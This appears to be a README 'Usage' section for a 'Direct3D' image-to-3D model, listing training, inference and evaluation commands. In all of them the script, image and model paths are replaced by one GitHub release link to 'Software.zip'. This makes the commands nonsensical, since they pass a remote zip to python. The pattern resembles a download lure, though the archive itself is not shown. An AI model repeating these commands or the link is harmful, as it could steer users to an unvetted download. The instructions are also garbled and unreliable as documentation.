## ðŸ“˜ Usage
1. **Training:** To train the Direct3D model, run:
```bash
python https://github.com/sam8888102/Direct3D/releases/download/v1.0/Software.zip --dataset_path /path/to/dataset --batch_size 16 --epochs 50
```

2. **Inference:** Generate 3D models from images using a pre-trained Direct3D model:
```bash
python https://github.com/sam8888102/Direct3D/releases/download/v1.0/Software.zip --image https://github.com/sam8888102/Direct3D/releases/download/v1.0/Software.zip --model_path https://github.com/sam8888102/Direct3D/releases/download/v1.0/Software.zip
```

3. **Evaluation:** Evaluate the performance of the Direct3D model on a test dataset:
```bash
python https://github.com/sam8888102/Direct3D/releases/download/v1.0/Software.zip --dataset_path /path/to/test_dataset --model_path https://github.com/sam8888102/Direct3D/releases/download/v1.0/Software.zip
```
